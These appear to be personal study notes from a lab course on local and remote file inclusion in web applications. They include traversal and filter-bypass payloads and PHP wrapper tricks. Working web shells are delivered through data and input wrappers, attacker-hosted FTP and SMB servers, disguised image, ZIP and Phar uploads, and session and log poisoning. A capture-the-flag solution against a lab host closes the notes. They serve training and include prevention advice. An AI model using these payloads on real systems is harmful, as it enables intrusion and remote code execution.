hac# Local File Inclusion
* most common place within template engines
* templating engine displays common static parts (header, naivgation-bar, footer) and then dynamically loads the content changes between pages
* often seen in URLs like `/index.php?page=about`
* LFI can leak to source code disclosure, sensitive data exposure and even RCE

### Examples of Vulnerable Code
**PHP**
```php
if (isset($_GET['language'])) { include($_GET['language']); }
```
* language parameter is directly passed to include
* any path we pass in this parameter will be loaded to the page

**NodeJS**
```javascript
if(req.query.language) { 
	fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
		 res.write(data); 
	}); 
}
```
* whatever parameter is passed from URL gets used by `readfile` function
* Another example: `render()` function in express framework

```javascript
app.get("/about/:language", function(req, res) {
	 res.render(`/${req.params.language}/about.html`); 
});
// Note: This is in path not via URL parameter
```

**Java**
```jsp
<c:if test="${not empty param.language}"> 
	<jsp:include file="<%= request.getParameter('language') %>" /> 
</c:if>
```
```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

**.NET**
```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) { 
	<% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```
```cs
@Html.Partial(HttpContext.Request.Query['language'])
```
```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

### Read vs. Execute
* some functions only read content of specified data, others also execute

| Function                     | Read Content | Execute | Remote URL |
| ---------------------------- | ------------ | ------- | ---------- |
| **PHP**                      |              |         |            |
| `include()`/`include_once()` | +            | +       | +          |
| `require()`/`require_once()` | +            | +       | -          |
| `file_get_contents()`        | +            | -       | +          |
| `fopen()`/`file()`           | +            | -       | -          |
| **NodeJS**                   |              |         |            |
| `fs.readFile()`              | +            | -       | -          |
| `fs.sendFile()`              | +            | -       | -          |
| `res.sender()`               | +            | +       | -          |
| **Java**                     |              |         |            |
| `include`                    | +            | -       | -          |
| `import`                     | +            | +       | +          |
| **.NET**                     |              |         |            |
| `@Html.Partial()`            | +            | -       | -          |
| `@Html.RemotePartial()`      | +            | -       | +          |
| `Response.WriteFile()`       | +            | -       | -          |
| `include`                    | +            | +       | +          |

# File Disclosure
## Basic LFI
* two common readable files:
	* Windows: `C:\Windows\boot.ini`
	* Linux: `/etc/passwd`
* **Path Traversal**
	* In many cases: developers prepend or append a string to the parameter
	* so absolute file paths won't work
	* Use directory traversal via: `../`
	* Note: while we can just add arbitrary `../`, it is still best to find minimal amount needed
	* In some cases: `/../...` is needed (if file is prefixed)
* **Appended Extensions**
	* Often: file extension is appended
	* some bypasses (later)
* **Second Order Attacks**
	* not direct user input but instead something like usernames or other poisoned database entries

## Basic Bypasses
**Non-Recursive Path Traversal Filters**
* one of the most basic filters:
	* search and replace filter which simply deletes substrings of `../`
* Example:
```php
$language = str_replace('../', '', $_GET['language']);
```
* inherently not secure, as it is not recursively removing the `../` substring
	* `....//` becomes `../`
	* some other payloads that might work:
		* `..././`, `....\/`, `....////`
**Encoding**
* some web filters may prevent characters like a dot `.` or slash `/`
* some of these filters may be bypassed by URL encoding the input
	* `%2e%2e%2f`
	* Note: For this to work, we need to encode all characters. Some URL encoders may not encode dots as they are considered part of URL scheme
**Approved Paths**
* some web apps may use regex to ensure that file is included under a specific path
* Example: web app only accept paths that are under `./languages` directory
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
	 include($_GET['language']); 
} else { 
	echo 'Illegal path specified!'; 
}
```
* Now: find approved path via request examination of existing forms or fuzzing of web directories
* Then: Prepend payload with approved directory
**Appended Extension**
* modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension (which can still be useful)
* Following techniques: `PHP versions before 5.3/5.4`
**Path Trunctation**
* earlier versions of PHP: defined strings have maximum length of 4096 characters
* if longer string is passed: it will be truncated, any character after max length will be ignored
* PHP also used to remove trailing slashes and single dots in path names
	* `/etc/passwd/.`, then `/.` would be truncated
* Whenever we send string over 4096 charcters: `.php` extension would be truncated -> path without this extension type
* also important to note: need to start the path with a non existing directory for this technique to work
```url
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```
```shellsession
lunims@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```
**Null Bytes**
* PHP versions prior 5.5 vulnerable to `null byte injection`
* add a null byte `%00` at the end of string, which terminates the string and not consider anything after it
	* `/etc/passwd%00`

## PHP Filters
* [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php)
* PHP Wrappers allow us to access different I/O streams at application level, like standard input/output, file descriptors and memory streams
* This is not only beneficial with LFI, but also with other web attacks like XXE 
### Input Filters
* to use PHP wrapper streams, we can use the `php://` scheme in our string and we can access PHP filter wrapper with `php://filter/`
* Filter wrapper has several parameters, however most important ones: `resource` and `read`
	* `resource`: required for filter wrappers, with it we can specify the stream we would like to apply the filter on (e.g. local file)
	* `read`: can apply different filters on input resource, so we can use it to specify which filter we want to apply on resource
		*  [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
		* filter useful for LFI: `convert.base64-encode`
### Fuzzing for PHP files
* First step would be to fuzz for different available PHP files with tools like `ffuf` or `gobuster`
```shellsession
lunims@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php 

...SNIP... 
index [Status: 200, Size: 2652, Words: 690, Lines: 64] 
config [Status: 302, Size: 0, Words: 1, Lines: 1]
```
### Source Code Disclosure
```url
php://filter/read=convert.base64-encode/resource=config
```

# Remote Code Execution
### PHP Wrappers
* trivial ways: Check for config files (e.g. `config.php`), which might include credentials (like ssh)
* or check `.ssh` directory to look for ssh keys

### Data Wrapper
* [data](https://www.php.net/manual/en/wrappers.data.php)
* can be used to incldue external data, including PHP code
	* only available, if `allow_url_include` setting is enabled in PHP configurations
* **Checking PHP Configurations**
	* For Apache: `/etc/php/X.Y/apache2/php.ini`
	* For Nginx: `/etc/php/X.Y/fpm/php.ini`
```shellsession
lunims@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" <!DOCTYPE html> <html lang="en"> 

...SNIP... 

<h2>Containers</h2> W1BIUF0KCjs7Ozs7Ozs7O ...SNIP... 4KO2ZmaS5wcmVsb2FkPQo= <p class="read-more">
```
```shellsession
lunims@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include 

allow_url_include = On
```

**Remote Code Execution**
* Encode a basic web shell:
```shellsession
lunims@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
* now URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64`
* we can use web shell with `&cmd=<COMMAND>`
```shellsession
lunims@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Input Wrapper
* [input](https://www.php.net/manual/en/wrappers.php.php)
* difference: we pass our input to the `input` wrapper as POST request's data
* so vulnerable Parameter must accept POST requests for this attack to work
* also depends on `allow_url_include` to be on
```shellsession
lunims@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

### Expect
* [expect](https://www.php.net/manual/en/wrappers.expect.php)
* don't need to provide a web shell, as it is designed to execute commands
* `expect` is an external wrapper, so it needs to be manually installed and enabled on back-end server
* check for extension:
```shellsession
lunims@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect 

extension=expect
```
* Usage:
```shellsession
lunims@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Remote File Inclusion
* [Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion), if vulnerable function allows the inclusion of remote URLs
* almost any RFI is also an LFI, but not the other way around

### Verify RFI
* remote URL is usually disabled by default
* again: in PHP `allow_url_include` needs to be on
* However: even if this is enabled, this does not mean we have an RFI vuln
* basically: just try a remote URL and see if it is included
	* at first: start with local url to ensure it does not get blocked by a firewall for example
	* `http://127.0.0.1:80/index.php`
### RCE with RFI
* Create a web shell:
```shellsession
lunims@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
* host this script and access it, should use ports `80` or `443` as these are usually whitelisted
```shellsession
lunims@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT> 

Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) 
...
```
### FTP
* use Pythons `pyftpdlib`
```shellsession
lunims@htb[/htb]$ sudo python -m pyftpdlib -p 21 

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<< 
[SNIP] concurrency model: async 
[SNIP] masquerade (NAT) address: None 
[SNIP] passive ports: None
```
* may be useful, when http ports are blocked by a firewall or `http://` string gets blocked by WAF
* Include the script via:
```url
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```
### SMB
* if hosted on vulnerable Windows server, we do not need the `allow_url_include` setting enabled
* can utilize SMB protocol for remote file inclusion
	* Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path
```shellsession
lunims@htb[/htb]$ impacket-smbserver -smb2support share $(pwd) 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation 

[*] Config file parsed 
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed 
[*] Config file parsed 
[*] Config file parsed
```
* include the script by using a UNC path, e.g. `\\OUR_IP\share\shell.php`
```url
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```
* Note: accessing remote SMB servers over the internet may be disabled by default on some Windows servers, hence more likely to work within network

## LFI and File Uploads
* for the attack we do not require the file upload form to be vulnerable, but merely allow us to upload files
* if vulnerable function has `Execute` capabilities, then the code within file will get executed if we include it regardless of file extension or file type
* For example: upload image .jpg and store PHP web shell within it 'instead of image data'
	* include it via LFI vuln, code gets executed

### Crafting and Uploading Malicious image
```shellsession
lunims@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
* Upload it, then find it out where it stored
* For example, profile pictures get included in profile like:
```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```
* access it:
```url
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

### ZIP Upload
* above technique is really reliable and should work most of the time as long as vulnerable function allows code execution
* [zip](https://www.php.net/manual/en/wrappers.compression.php) for PHP code
* is not enabled by default
```shellsession
lunims@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
**Note:** Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.
* Payload:
```url
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
### Phar Upload
```php
<?php 
$phar = new Phar('shell.phar'); 
$phar->startBuffering(); 
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>'); 
$phar->setStub('<?php __HALT_COMPILER(); ?>'); 

$phar->stopBuffering();
```
* script can be compiled into `phar` file
	* when called, would write a web shell to a `shell.txt` sub-file, which we can interact with
```shellsession
lunims@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
* Payload
```url
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

## Log Poisoning
### PHP Session Poisoning
* most PHP web app utilize `PHPSESSID` cookies, which can hold user-related data on back-end
* these details are stored in `session` files on back-end and saved in `/var/lib/php/sessions` on Linux and `C:\Windows\temp` on Windows
	* For example: `PHPSESSID=el4ukv0kqbvoirg7nkp4dncpk3` -> `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`
* Include this file in LFI
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
* Poison the session:
```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
* Payload:
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction
### Server Log Poisoning
* Both `Apache` and `Nginx` maintain various log file such `access.log` and `error.log`
* `access.log` file contains various information, such as `User-Agent` header
	* Poison User-agent header
	* then include log in LFI
* Apache:
	* Linux: `/var/log/apache2/`
	* Windows: `C:\xampp\apache\logs\`
* Nginx:
	* Linux: `/var/log/nginx/`
	* Windows: `C:\nginx\log\`
* Fuzz, if they are on other locations:
	* [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
```shellsession
lunims@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison 
lunims@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```
* Other logs:
	* - `/var/log/sshd.log`
	- `/var/log/mail`
	- `/var/log/vsftpd.log`

## Automated Scanning
### Fuzzing Parameters
* HTML forms, users are exposed to tend to be properly tested and well secured against different web attacks
* in many cases: page may have other exposed parameters that are not linked to HTML forms

```shellsession
lunims@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs
```
* **LFI wordlists**
	*  [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
	* [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
* **Fuzzing Server Files**
	*  [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
	*  [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
```shellsession
lunims@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```
* **LFI Tools**
	* [LFISuite](https://github.com/D35m0nd142/LFISuite)
	* [LFiFreak](https://github.com/OsandaMalith/LFiFreak)
	* [liffy](https://github.com/mzfr/liffy)
## Inclusion Prevention
* most effective: avoid passing any user-controlled inputs into any file inclusion functions or APIs
	* page should be able to dynamically load assets on back-end with no user information
* whenever any of these function is used: we should ensure that no user input is directly going into them
* in cases where architecture can not be changed: 
	* whitelist the files that need to be allowed 
* Preventing Directory Traversal:
	* PHP: `basename()` function (not able to enter any directories)
```php
while(substr_count($input, '../', 0)) { 
	$input = str_replace('../', '', $input); 
};
```
* Web Server Configuration
	* `allow_url_fopen` and `allow_url_include` should be set to off
	* also possible to lock web apps to web root directory
		* e.g. running the app with Docker
		* PHP: `open_basedir = /var/www` in php.ini file
* WAF
	* e.g. `ModSecurity`

# Skill Assessment 

Found image URL with parameter exposed. After some trial following payload worked:
http://154.57.164.79:30216/api/image.php?p=....//....//....//....//etc/passwd

Application.php:
```php
|   |
|---|
|<?php|
|$firstName = $_POST["firstName"];|
|$lastName = $_POST["lastName"];|
|$email = $_POST["email"];|
|$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;|
||
|$tmp_name = $_FILES["file"]["tmp_name"];|
|$file_name = $_FILES["file"]["name"];|
|$ext = end((explode(".", $file_name)));|
|$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;|
|move_uploaded_file($tmp_name, $target_file);|
||
|header("Location: /thanks.php?n=" . urlencode($firstName));|
|?>|
```
Contact.php:
```php
|   |
|---|
|<?php|
|$region = "AT";|
|$danger = false;|
||
|if (isset($_GET["region"])) {|
|if (str_contains($_GET["region"], ".") \| str_contains($_GET["region"], "/")) {|
|echo "'region' parameter contains invalid character(s)";|
|$danger = true;|
|} else {|
|$region = urldecode($_GET["region"]);|
|}|
|}|
||
|if (!$danger) {|
|include "./regions/" . $region . ".php";|
|}|
|?>|
```

http://154.57.164.79:30216/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=cat%20/flag_09ebca.txt